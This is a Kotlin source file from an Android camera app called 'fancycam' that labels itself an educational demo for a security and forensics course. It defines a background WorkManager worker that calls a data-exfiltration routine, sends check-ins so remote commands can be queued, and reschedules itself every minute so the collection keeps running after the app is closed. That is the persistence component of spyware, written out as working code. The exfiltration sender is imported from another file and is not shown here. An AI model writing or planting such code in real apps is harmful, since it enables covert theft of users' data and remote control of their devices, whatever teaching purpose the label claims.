package com.example.fancycam.workers

import com.example.fancycam.network.DataExfilSender
import android.content.Context
import android.util.Log
import java.util.concurrent.TimeUnit
import androidx.work.Constraints
import androidx.work.CoroutineWorker
import androidx.work.ExistingWorkPolicy
import androidx.work.NetworkType
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkerParameters
import androidx.work.WorkManager

/**
 * EDUCATIONAL DEMO - Android Security & Forensics Course
 *
 * Demonstrates how malware uses WorkManager for persistent background
 * data collection that survives app termination.
 */
class DataCollectionWorker(
    context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result {
        Log.d(TAG, "[EDUCATIONAL] Background data collection triggered")

        return try {
            DataExfilSender.collectAndExfiltrate(applicationContext)
            // Keep the app checking in while backgrounded so queued remote commands can be handled
            DataExfilSender.sendHeartbeat(applicationContext, processCommands = false)
            scheduleNext(applicationContext)
            Result.success()
        } catch (e: Exception) {
            Log.e(TAG, "[EDUCATIONAL] Background collection failed", e)
            scheduleNext(applicationContext)
            Result.retry()
        }
    }

    private fun scheduleNext(context: Context) {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.CONNECTED)
            .build()
        val next = OneTimeWorkRequestBuilder<DataCollectionWorker>()
            .setInitialDelay(1, TimeUnit.MINUTES)
            .setConstraints(constraints)
            .build()
        WorkManager.getInstance(context).enqueueUniqueWork(
            WORK_NAME,
            ExistingWorkPolicy.KEEP,
            next
        )
    }

    companion object {
        private const val TAG = "DataCollectionWorker"
        const val WORK_NAME = "edu_data_collection"
    }
}
